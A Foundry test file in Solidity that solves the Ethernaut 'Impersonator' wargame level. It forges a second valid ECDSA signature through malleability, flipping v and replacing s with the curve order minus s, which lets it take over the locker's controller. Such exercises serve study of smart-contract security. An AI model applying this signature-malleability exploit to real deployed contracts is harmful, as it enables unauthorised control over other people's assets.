// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Impersonator.sol";

contract ImpersonatorTest is Test {
    Impersonator instance;
    // source: https://sepolia.etherscan.io/address/0x9D75AF88C98C2524600f20B614ee064aE356C19C
    bytes public signature =
        hex"1932CB842D3E27F54F79F7BE0289437381BA2410FDEFBAE36850BEE9C41E3B9178489C64A0DB16C40EF986BECCC8F069AD5041E5B992D76FE76BBA057D9ABFF2000000000000000000000000000000000000000000000000000000000000001B";

    function setUp() public {
        instance = new Impersonator(1336);
        instance.deployNewLock(signature);
    }

    function test() public {
        ECLocker ecLocker = instance.lockers(0);
        assertNotEq(ecLocker.controller(), address(0));

        (bytes32 r, bytes32 s, bytes32 v) = abi.decode(
            signature,
            (bytes32, bytes32, bytes32)
        );

        // v can be either 27 or 28
        uint8 v2 = uint256(v) == 27 ? 28 : 27;

        // source: https://std.neuromancer.sk/secg/secp256k1
        // n: curve order, group size of the elliptic curve
        bytes32 n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
        // if v changes, we also need to use the other s on the same curve n - s
        bytes32 s2 = bytes32(uint256(n) - uint256(s));

        ecLocker.changeController(v2, r, s2, address(0));
        assertEq(ecLocker.controller(), address(0));
    }
}
